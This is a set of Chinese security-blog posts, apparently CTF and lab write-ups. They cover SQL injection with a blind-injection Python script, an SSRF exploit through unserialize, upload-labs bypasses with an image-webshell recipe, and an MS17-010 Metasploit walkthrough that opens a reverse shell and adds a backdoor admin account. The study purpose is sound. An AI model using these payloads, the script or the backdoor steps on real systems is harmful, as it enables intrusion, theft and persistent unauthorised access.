接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了 name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11提示的wrong user! name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11提示的wrong pass! 第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知） payload: name=000&#x27;union select 1,&#x27;admin&#x27;,&#x27;b59c67bf196a4758191e42f76670ceba&#x27;#&amp;pw=1111 b59c67bf196a4758191e42f76670ceba是1111的md5值，pw的值为1111 [极客大挑战 2019]FinalSQL与hard sql是一个系列的，但是这个应该是盲注 在search.php中找到注入点，测试可以发现是数字型注入 fuzz之后可以发现对于不同的字符，回显不同，并且过滤了空格，但是^没有被过滤，所以可以利用这个符号 可以看到当id = 1 时，页面回显为，可以将这个为判断的标志 1^1^1 = 1 1^0^1 = 0 所以可以将注入的payload加到中间，例如 1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))=%d)^1&quot;%(i,ord(j)) 注入脚本如下，使用的是二分法 import requests import time url = &quot;http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php&quot; flag = &#x27;&#x27; def payload(i, j): time.sleep(1) # sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j) #数据库名字 # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j) #表名 # sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j) #列名 sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, j) data = &#123;&quot;id&quot;: sql&#125; r = requests.get(url, params=data) if &quot;Click&quot; in r.text: res = 1 else: res = 0 return res def exp(): global flag for i in range(1, 10000): print(i, &#x27;:&#x27;) low = 31 high = 127 while low &lt;= high: mid = (low + high) // 2 res = payload(i, mid) if res: low = mid + 1 else: high = mid - 1 f = int((low + high + 1)) // 2 if (f == 127 or f == 31): break # print (f) flag += chr(f) print(flag) exp() print(&#x27;flag=&#x27;, flag) 又学到了新的注入姿势，真不错 参考：https://www.cnblogs.com/wangtanzhi/p/12305052.html","tags":[{"name":"二分注入","slug":"二分注入","permalink":"https://sunzhengyu99.github.io/tags/%E4%BA%8C%E5%88%86%E6%B3%A8%E5%85%A5/"},{"name":"报错注入","slug":"报错注入","permalink":"https://sunzhengyu99.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"union新姿势","slug":"union新姿势","permalink":"https://sunzhengyu99.github.io/tags/union%E6%96%B0%E5%A7%BF%E5%8A%BF/"}]},{"title":"网安作业1","date":"2020-09-27T14:21:14.000Z","path":"2020/09/27/homework/","text":"MS17-010 1.准备工作开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方 将两台虚拟机桥接到同一网卡，并保证能够通信 Kali IP 10.1.1.1 255.0.0.0 win7 IP 10.1.1.2 255.0.0.0 测试两台主机之间的通信情况 使用msf前需要开启postgresql服务 开启服务：service postgresql start 查看服务状态：service postgresql status 开到绿色字体的active即为开启了 初始化数据库：msfdb init 2. 攻击过程(1).首先判断目标主机是否打开445端口使用nmap+ip 扫描 (2) .确认目标主机打开445端口后直接使用msf进行攻击输入msfconsole 启动msf 输入search MS17-010 找到exploit windows/smb/ms17_010_eternalblue, 运行 use exploitwindows/smb/ms17_010_eternalblue 输入 show options 查看需要配置哪些信息 RHOSTS 为目标主机IP(10.1.1.2) RPORT 为目标端口号(445) LHOST 为监听主机IP(10.1.1.1) (3). 配置成功后设置tcp连接输入命令 set payload windows/x64/meterpreter/reverse_tcp (4).开始运行输入 exploit/run 成功获取shell 查看ip地址验证是否为目标主机。 (5)设立后门，在目标主机中创建一个用户创建一个用户 net user test abc123.com /add Username:test password:abc123.com 将该用户加入管理员组，使其拥有管理员权限 net localgroup administrtors test /add 目标主机上用户创建成功 实验结束","tags":[{"name":"msf","slug":"msf","permalink":"https://sunzhengyu99.github.io/tags/msf/"}]},{"title":"fakebook","date":"2020-09-27T11:17:01.000Z","path":"2020/09/27/fakebook/","text":"攻防世界-fakebook感觉挺有意思的一道题，所以记录一下吧 0x01发现注入点进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方 http://220.249.52.133:44224/view.php?no=1参数no这里应该是一个数字型的注入点，测试一下。 http://220.249.52.133:44224/view.php?no=1 and 1=1显示是正常的，但是 http://220.249.52.133:44224/view.php?no=1 and 1=2网页报错，确定了就是数字型注入 接下来继续注入的常规操作。 http://220.249.52.133:44224/view.php?no=-2 order by 4#时页面显示正常，并提示了网站的根目录 但是当 order by 5 # 时，网页报错，确定是四列。 爆表名 本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测 试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示 Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 提示存在反序列化，但是不知道怎么用继续爆表。 ?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4# ?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;# 爆出一大堆列名。直接读取data的内容 no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ?no=-2 union/**/select 1,(select data from users),3,4 # 发现内容是注册时信息保存为序列化内容 O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;} 到这里就不知道怎么办了。。。 0x02审计源码扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径 源码 &lt;?php class UserInfo //user信息类 &#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) // 处理url &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125; &#125; 审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。 思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。 ?no=-2%20union/**/select%201,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;sunzy&quot;;s:3:&quot;age&quot;;i:22;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;%20# 查看源码，解base64。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"unserailize","slug":"unserailize","permalink":"https://sunzhengyu99.github.io/tags/unserailize/"}]},{"title":"upload-11-21","date":"2020-09-18T13:58:51.000Z","path":"2020/09/18/upload2/","text":"upload-labs 11-21 pass11$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 这段代码是将文件名中出现 deny_ext的后缀名替换为空 可以双写绕过，即1.pphphp pass12$is_upload = false; $msg = null; if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125; &#125; 本题与之前的题目有所不同，这题的文件的保存路径是可以控制的 这里用的%00截断，原理如下 www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php pass13这题与上题利用的原理相同 但是这里要使用 00的二进制形式 pass14明确说了上传图片木马 function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType; &#125; GIF89a 是GIF图片的文件头 ，是为了绕过gif文件的检查 图片木马的制作 桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马 copy 2.jpg /b + 1.php /a webshell.jpg 未完待续。。。","tags":[{"name":"双写绕过","slug":"双写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":"00截断","slug":"00截断","permalink":"https://sunzhengyu99.github.io/tags/00%E6%88%AA%E6%96%AD/"}]},{"title":"uploads-labs","date":"2020-09-16T13:48:48.000Z","path":"2020/09/16/uploads/","text":"upload-labs 1-10 pass1直接抓包修改文件后缀名为jpg,png,gif即可 pass2查看源码 if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) 这段代码说明是对文件的MIME类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,这三个类型都为图片 抓包修改MIME即可 知识点补充： MIME类型对大小写不敏感，但是传统写法都是小写。 text/plain text/html image/jpeg image/png audio/mpeg audio/ogg audio/* video/mp4 application/* application/json application/javascript application/ecmascript application/octet-stream 更详细的解释， pass3$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); 只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过 pass4.htaccess文件的作用 URL重写、自定义错误页面 MIME类型配置 访问权限控制等 主要体现在伪静态的应用 图片防盗链 自定义404错误页面 阻止/允许特定IP/IP段 目录浏览与主页 禁止访问指定文件类型 文件密码保护 &lt;FilesMatch &quot;1.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 这几句代码的意思： 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件， 无论扩展名是什么(没有也行)，都以php的方式来解析 上传完.htaccess文件后直接上传一个 1.jpg即可 pass5$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 本题与第十题完全一样，详细解答见第十题 pass6$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 仔细查看源码会发现少了下面的这段代码 $file_ext = strtolower($file_ext); //转换为小写 这里就可以大小写绕过。将文件后缀名改为.pHp , .PHP等 pass7$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 跟第六关对比发现少了这句话 $file_ext = trim($file_ext); //首尾去空 利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php pass8$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 这段代码少了这句话，可以与第六关相同的做法 $file_name = deldot($file_name);//删除文件名末尾的点 pass9$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 仔细观察发现少了这段代码 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 采用Windows文件流特性绕过 将文件名改为 1.php::$DATA,但是实质上保存的文件还是1.php pass10$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 这一句代码是用来检测末尾是否是.，可以双写绕过。抓包将文件名改为1.php. . （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了","tags":[{"name":"MIME","slug":"MIME","permalink":"https://sunzhengyu99.github.io/tags/MIME/"},{"name":"大小写绕过","slug":"大小写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":".htaccess","slug":"htaccess","permalink":"https://sunzhengyu99.github.io/tags/htaccess/"},{"name":"windows文件特性","slug":"windows文件特性","permalink":"https://sunzhengyu99.github.io/tags/windows%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7/"}]},{"title":"bugku代码审计","date":"2020-09-14T13:01:01.000Z","path":"2020/09/14/decode/","text":"简单的代码审计 extract变量覆盖&lt;?php $flag=&#x27;xxx&#x27;; //新建变量 extract($_GET); // 变量覆盖 if(isset($shiyan)) //判断是否存在 &#123; $content=trim(file_get_contents($flag));//把文件读入字符串 if($shiyan==$content) //判断两变量是否相等 &#123; echo&#x27;flag&#123;xxx&#125;&#x27;; &#125; else &#123; echo&#x27;Oh.no&#x27;; &#125; &#125; ?&gt; extract()函数 isset()函数isset() 函数用于检测变量是否已设置并且非 NULL。 如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。 若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。 同时要注意的是 null 字符（”\\0”）并不等同于 PHP 的 NULL 常量。 